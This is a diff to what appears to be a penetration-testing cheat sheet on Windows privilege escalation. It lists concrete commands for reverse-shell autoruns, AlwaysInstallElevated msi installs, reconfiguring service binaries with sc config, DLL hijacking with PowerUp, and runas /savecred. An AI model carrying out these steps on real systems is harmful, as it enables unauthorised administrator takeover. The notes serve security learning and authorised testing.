@@ -681,17 +681,16 @@ runas /user:DOMAIN\Administrator /savecred "cmd.exe /c whoami"
 - Autorun  
 
 Check with sysinternal tools [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) and [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), run `Autoruns64.exe` to look for autorun specs in HKLM and `accesschk64.exe -wvu $PROG` to check if `FILE_ALL_ACCESS` for `Everyone` is set.  
-Or with [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), run `Get-ModifiableRegistryAutoRun`.  
-
 Replace the program with a reverse shell (msfvenom will be handy). Program will be run next time an administrator logs in, giving an admin shell on listener.  
+
+With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ModifiableRegistryAutoRun`.  
 
 - AlwaysInstallElevated  
 
 Check in registry with `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` and `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` if `AlwaysInstallElevated` is set to 1.  
-Or with [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) with `Get-RegAlwaysInstallElevated`.  
-
 Create msi reverse shell with msfvenom and execute with `msiexec /quiet /qn /i c:\path\rev.msi`.  
-Or use `Write-UserAddMSI` of PowerUp to create local admin.  
+
+With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-RegAlwaysInstallElevated` and abuse with `Write-UserAddMSI` to create local admin.  
 
 - regsvc  
 
@@ -702,13 +701,14 @@ If so, make .exe reverse shell with msfvenom and change the registry key with `r
 - Insecure service permissions  
 
 Check with `accesschk64.exe -uwcqv *` if you are member of any group. You can restrict output by supplying group parameter, like `accesschk64.exe -uwcqv "Everyone" *`. Look for `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`, `GENERIC_WRITE`, `GENERIC_ALL`, `WRITE_DAC` or `WRITE_OWNER` permissions.  
-
 If so, you can reconfigure service and supply reverse shell executable made with msfvenom as parameter :
 ```
 sc config $SERVICE binPath= "c:\path\rev.exe"
 net stop $SERVICE
 net start $SERVICE
 ```
+
+With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ServiceFilePermission` and abuse with `Install-ServiceBinary`.  
 
 - Startup applications  
 
@@ -719,7 +719,8 @@ If so, place reverse shell executable in directory, log off and wait for an admi
 - DLL hijacking  
 
 todo : with procmon from systinternals
-todo : with powerup with Find-ProcessDLLHijack
+
+With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Find-DLLHijack` and `Find-PathHijack` and abuse with `Write-HijackDll`.  
 
 - Alternative to executables  
 
